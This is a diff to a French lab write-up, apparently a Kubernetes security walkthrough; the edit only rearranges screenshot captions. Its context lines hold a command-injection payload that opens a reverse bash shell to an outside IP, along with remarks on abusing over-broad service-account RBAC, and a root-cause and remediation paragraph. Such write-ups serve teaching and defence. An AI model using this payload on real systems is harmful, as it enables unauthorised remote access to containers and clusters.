@@ -264,8 +264,9 @@ google.com; bash -i >& /dev/tcp/159.31.67.243/9001 0>&1
 
 Cette commande exécute d'abord le nslookup légitime pour `google.com`, puis (`; `) redirige le shell bash interactif (`bash -i`) vers le socket TCP ouvert sur le port 9001 de notre machine (`159.31.67.243`). La connexion entrante dans `nc` ouvre alors un terminal bash à l'intérieur du pod.
 
-![Reverse shell obtenu depuis le pod vulnnode](image/reverse-shell.png)
+![Mise en place du reverse shell dans la page web](image/reverse-shell.png)
 
+![Accès au shell et exploration du service account](image/shell-acces.png)
 **Cause racine et remédiation :** la vulnérabilité provient de l'invocation d'un shell système avec une entrée utilisateur non filtrée. La solution consiste à supprimer tout appel shell au profit d'un appel direct au binaire avec arguments séparés (`subprocess.run([...], shell=False)`, `execFile()`) ou idéalement d'une bibliothèque de résolution DNS native de la plateforme.
 
 ---
@@ -305,8 +306,6 @@ chmod +x kubectl
 ```
 
 Si le service account possède des droits RBAC trop larges (ClusterRole avec des permissions excessives), on peut lister et interagir avec des ressources de l'ensemble du cluster, voire créer de nouveaux pods - ce qui est la porte d'entrée vers l'étape suivante.
-
-![Accès au shell et exploration du service account](image/shell-acces.png)
 
 ---
 
